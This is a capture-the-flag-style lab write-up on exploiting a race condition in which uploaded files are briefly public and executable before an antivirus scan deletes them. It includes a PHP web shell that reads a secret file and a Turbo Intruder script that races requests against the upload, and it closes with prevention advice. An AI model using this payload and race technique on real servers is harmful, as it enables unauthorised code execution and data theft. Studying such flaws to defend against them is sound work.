# ⏱️ Web Shell Upload — Race Condition in Antivirus Validation

## 🎯 Objective
- Exploit upload-processing timing flaws to:
  - Upload malicious PHP shell
  - Trigger execution before validation completes
  - Abuse temporary insecure storage
  - Achieve remote code execution
  - Extract sensitive files

---

## ❗ Why This Matters

- Secure validation must occur **before exposure**
- Temporary access windows can:
  - Nullify strong validation
  - Enable short-lived RCE
- Real-world race conditions often exist in:
  - AV scanning
  - Cloud pipelines
  - File processing queues

---

## 🧪 Exercises Performed

# 🔍 Part 1 — Source Code Review

## 1️⃣ Vulnerable Workflow

### Upload Process:

1. File uploaded
2. Moved to public directory
3. Virus scan initiated
4. Malicious file removed afterward

---

### Security Issue:

```text 
File is publicly accessible before validation completes
````

---

## ⚠️ Core Vulnerability

```text 
TOCTOU (Time-of-check to time-of-use) race condition
```

---

# 🚀 Part 2 — Malicious PHP Payload

## 2️⃣ Payload File

### Filename:

```php 
exploit.php
```

---

### Payload:

```php 
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

### Goal:

- ✔️ Read Carlos’s secret
- ✔️ Execute before deletion

---

# 🚀 Part 3 — Direct Upload Attempt

### Result:

- ❌ Validation eventually blocks upload

---

### Observation:

- ✔️ Server eventually deletes malicious file
- ✔️ Temporary execution window exists

---

# 🚀 Part 4 — Turbo Intruder Race Attack

## 4️⃣ POST Request

### Function:

- ✔️ Upload PHP shell

---

## 5️⃣ GET Requests

### Function:

- ✔️ Repeatedly request:

  ```http
  /files/avatars/exploit.php
  ```

---

### Strategy:

* 1 upload request
* Multiple parallel retrieval requests
* Synchronize final byte delivery

---

# 🛠️ Turbo Intruder Script

```python 
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''POST /my-account/avatar HTTP/1.1
    ...
    '''

    request2 = '''GET /files/avatars/exploit.php HTTP/1.1
    Host: target
    '''

    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

---

# 🚀 Part 5 — Successful Exploitation

### Result:

- ✔️ Some GET requests return:

  ```text 
  Carlos's secret
  ```

---

### Explanation:

- ✔️ File uploaded
- ✔️ Publicly reachable
- ✔️ Executed before deletion

---

## 🏁 Lab Completion

* TOCTOU flaw identified
* Upload timing exploited
* Parallel request racing performed
* Temporary web shell executed
* Sensitive data extracted

---

## 🧠 Key Takeaways

* Validation timing is critical
* Temporary exposure can defeat strong defenses
* Race conditions can bypass:

  * Antivirus
  * Moderation
  * Sandboxing
* Parallel tooling is essential
* Secure systems validate before public placement

---

## 🔥 Core Vulnerability

```text
Uploaded files became executable before antivirus validation completed, enabling temporary remote code execution
```

---

## 🛡️ Prevention

* Validate:

  * Before public storage
* Store:

  * In quarantine
* Publish:

  * Only after approval
* Use:

  * Atomic file moves
* Prevent:

  * Public access during scanning
* Secure:

  * Processing pipelines

---

## ⚠️ Security Principle

```text 
If malicious files exist before validation finishes, attackers only need milliseconds
```

---

## 🏁 Status

- ✔️ Lab Completed
